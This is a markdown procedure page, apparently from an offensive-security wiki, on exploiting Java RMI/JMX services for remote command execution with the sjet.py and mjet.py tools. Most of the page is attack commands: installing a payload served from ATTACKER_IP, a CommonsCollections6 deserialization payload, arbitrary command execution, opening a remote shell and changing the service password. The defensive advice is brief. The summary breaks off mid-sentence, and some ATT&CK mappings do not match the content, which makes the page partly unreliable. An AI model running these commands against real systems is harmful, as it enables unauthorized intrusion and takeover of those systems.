---
id: a711b78b-57c7-4aad-b1fb-e75dcbcb4690
name: Java RMI Exploitation for Remote Command Execution using sjet or mjet
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:00.906910+00:00'
updated_at: '2023-04-06T03:56:00.945880+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]'
- '[[Shortcut Modification|T1023 - Shortcut Modification]]'
- '[[Signed Binary Proxy Execution|T1218 - Signed Binary Proxy Execution]]'
tags:
- '[[Exploitation]]'
- '[[Java RMI]]'
- '[[RCE using sjet or mjet]]'
- '[[Remote Command Execution]]'
commands:
- '[[Change target machine password]]'
- '[[Deserialize CommonsCollections6 to execute command on target]]'
- '[[Execute command on target machine]]'
- '[[Execute ''whoami'' command on target using super_secret]]'
- '[[Install sjet.py tool]]'
- '[[Install super_secret on target]]'
- '[[Open shell on target machine]]'
- '[[Open shell on target using super_secret]]'
- '[[Uninstall sjet.py tool]]'
---

# Java RMI Exploitation for Remote Command Execution using sjet or mjet

## Summary

Java Remote Method Invocation (RMI) is a Java API that enables communication between Java programs running on different machines. The RMI service runs on a remote machine and listens on a specific port for incoming requests. The service is vulnerable to remote code execution (RCE) attacks if an att

## Description

# Description

Java Remote Method Invocation (RMI) is a Java API that enables communication between Java programs running on different machines. The RMI service runs on a remote machine and listens on a specific port for incoming requests. The service is vulnerable to remote code execution (RCE) attacks if an attacker can connect to the service and send a malicious payload. In this procedure, we will use the sjet.py and mjet.py tools to exploit the RMI service and execute remote commands.

The attacker can use this technique to gain remote access to the target machine and execute arbitrary commands. This can result in data theft, system compromise, and further lateral movement within the network.

To execute this attack, the attacker needs to have network access to the target machine and knowledge of the RMI service's location and credentials.

 

## Requirements

1. Network access to the target machine

1. Knowledge of the RMI service's location and credentials

1. sjet.py and mjet.py tools

 

## Defense

1. Disable the RMI service if it is not required

1. Use a firewall to restrict access to the RMI service

1. Use strong credentials for the RMI service

 

## Objectives

1. Execute remote commands on the target machine

1. Gain remote access to the target machine

 

# Instructions

1. 1. Install the payload on the target machine using the sjet.py tool
2. Execute arbitrary commands on the target machine using the sjet.py tool
3. Gain remote shell access to the target machine using the sjet.py tool
4. Change the password of the RMI service using the sjet.py tool
5. Uninstall the payload from the target machine using the sjet.py tool

 



**Code**: [[jython sjet.py TARGET_IP TARGET_PORT super_secret ]]



> The sjet.py tool is used to exploit the RMI service by installing a payload on the target machine. The payload is then used to execute arbitrary commands on the target machine, gain remote shell access, change the password of the RMI service, and uninstall the payload. The tool requires the IP address and port of the target machine, the credentials for the RMI service, and the location of the payload on the attacker's machine.



**Command** ([[Install sjet.py tool]]):

```bash
jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000
```





**Command** ([[Execute command on target machine]]):

```bash
jython sjet.py TARGET_IP TARGET_PORT super_secret command "ls -la"
```





**Command** ([[Open shell on target machine]]):

```bash
jython sjet.py TARGET_IP TARGET_PORT super_secret shell
```





**Command** ([[Change target machine password]]):

```bash
jython sjet.py TARGET_IP TARGET_PORT super_secret password this-is-the-new-password
```





**Command** ([[Uninstall sjet.py tool]]):

```bash
jython sjet.py TARGET_IP TARGET_PORT super_secret uninstall
```



2. 1. Execute a deserialization attack on the target machine using the mjet.py tool
2. Install the payload on the target machine using the mjet.py tool
3. Execute arbitrary commands on the target machine using the mjet.py tool
4. Gain remote shell access to the target machine using the mjet.py tool

 



**Code**: [[jython mjet.py --jmxrole admin --jmxpassword admin]]



> The mjet.py tool is used to exploit the RMI service by executing a deserialization attack on the target machine. The tool then installs a payload on the target machine, which is used to execute arbitrary commands and gain remote shell access. The tool requires the IP address and port of the target machine, the credentials for the RMI service, and the location of the payload on the attacker's machine.



**Command** ([[Deserialize CommonsCollections6 to execute command on target]]):

```bash
jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6 "touch /tmp/xxx"
```





**Command** ([[Install super_secret on target]]):

```bash
jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000
```





**Command** ([[Execute 'whoami' command on target using super_secret]]):

```bash
jython mjet.py TARGET_IP TARGET_PORT command super_secret "whoami"
```





**Command** ([[Open shell on target using super_secret]]):

```bash
jython mjet.py TARGET_IP TARGET_PORT command super_secret shell
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]
- [[Lateral Movement|TA0008 - Lateral Movement]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]
- [[Shortcut Modification|T1023 - Shortcut Modification]]
- [[Signed Binary Proxy Execution|T1218 - Signed Binary Proxy Execution]]

## Commands Used

- [[Change target machine password]]
- [[Deserialize CommonsCollections6 to execute command on target]]
- [[Execute command on target machine]]
- [[Execute 'whoami' command on target using super_secret]]
- [[Install sjet.py tool]]
- [[Install super_secret on target]]
- [[Open shell on target machine]]
- [[Open shell on target using super_secret]]
- [[Uninstall sjet.py tool]]

## Tags

- [[Exploitation]]
- [[Java RMI]]
- [[RCE using sjet or mjet]]
- [[Remote Command Execution]]


